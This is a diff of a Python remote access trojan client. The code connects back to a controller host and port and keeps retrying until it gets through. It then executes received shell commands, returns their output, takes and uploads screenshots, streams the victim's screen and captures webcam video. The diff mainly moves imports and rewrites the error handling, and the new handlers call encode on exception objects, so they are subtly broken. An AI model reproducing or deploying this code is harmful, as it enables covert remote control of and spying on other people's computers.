@@ -1,48 +1,57 @@
-#copyright © 2019-2021 manoharkakumani
+#copyright © 2019-2023 manoharkakumani
 import socket
 import os
 import subprocess
 import shutil
 import pickle
 import struct
+import pyautogui
+import cv2
+import numpy
+from PIL import ImageGrab
+
 s = socket.socket()
+host = '127.0.0.1'
+port = 9999
+
 #hostip
 def bind():
+    global host
+    global port
     try:
-        host = '127.0.0.1'
-        port = 9999
         s.connect((host, port))
     except:
         bind()
+
+
 # open shell or terminal or cmd
-def shell(data,s):
-    if data[:2]== 'cd':
-        os.chdir(data[3:])
-    if len(data) > 0:
-        cmd = subprocess.Popen(data[:],shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
-        output_byte = cmd.stdout.read() + cmd.stderr.read()
-        output_str = str(output_byte,"utf-8")
-        currentWD = os.getcwd() + "> "
-        s.send(str.encode(output_str + currentWD))
+def shell(data,conn):
+    try:
+        if data[:2]== 'cd':
+            os.chdir(data[3:])
+        if len(data) > 0:
+            cmd = subprocess.Popen(data[:],shell=True, stdout=subprocess.PIPE, stdin=subprocess.PIPE, stderr=subprocess.PIPE)
+            output_byte = cmd.stdout.read() + cmd.stderr.read()
+            output_str = str(output_byte,"utf-8")
+            currentWD = os.getcwd() + "> "
+            conn.send(str.encode(output_str + currentWD))
+    except Exception as e:
+        conn.send(e.encode("utf-8"))
+
 #screenshot
 def sshot(conn):
     try:
-        import pyautogui
         conn.send(('OK').encode("utf-8"))
         pic = pyautogui.screenshot()
         pic.save('myssdd.png')
         fup('myssdd.png',conn)
         os.unlink('myssdd.png')
-    except:
-        conn.send(('pyautogui not install in client').encode("utf-8"))
+    except Exception as e:
+        conn.send(e.encode("utf-8"))
+
 #screen_streaming
 def stream(conn):
     try:
-        import cv2,numpy,platform
-        if platform.system()=="Windows":
-            from PIL import ImageGrab
-        else:
-            import pyscreenshot as ImageGrab
         conn.send(('OK').encode("utf-8"))
         while True:
             if conn.recv(4096).decode('utf-8')=="sst":
@@ -53,14 +62,13 @@ def stream(conn):
                 conn.sendall(struct.pack(">L", size) + data)
             else:
                 break
-                return
-    except:
-        conn.send(('opencv-python or PIL not install in client').encode("utf-8"))
+        return
+    except Exception as e:
+        conn.send(e.encode("utf-8"))
 
 #camera
 def cam(conn):
     try:
-        import cv2
         conn.send(('OK').encode("utf-8"))
         cam = cv2.VideoCapture(0)
         if cam :
@@ -77,8 +85,8 @@ def cam(conn):
             return
         else:
             conn.send(('No camera Found').encode("utf-8"))
-    except:
-        conn.send(('opencv-python not install in client').encode("utf-8"))
+    except Exception as e:
+        conn.send(e.encode("utf-8"))
 
     
 # send file list
